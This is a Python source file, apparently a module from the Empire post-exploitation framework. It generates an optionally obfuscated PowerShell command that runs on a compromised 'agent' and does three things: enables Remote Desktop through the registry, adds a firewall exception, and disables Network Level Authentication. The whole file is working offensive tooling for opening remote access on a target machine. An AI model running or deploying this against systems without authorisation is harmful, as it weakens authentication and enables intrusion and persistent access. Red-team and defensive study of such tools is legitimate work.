from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Enable-RDP',
            'Author': ['@harmj0y'],
            'Description': ("Enables RDP on the remote machine and adds a firewall exception."),
            'Background' : False,
            'OutputExtension' : None,
            'NeedsAdmin' : True,
            'OpsecSafe' : False,
            'Language' : 'powershell',
            'MinLanguageVersion' : '2',
            'Comments': [ ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;"
        script += " if($?) {$null = netsh firewall set service type = remotedesktop mod = enable;"
        script += "$null = reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f }"
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script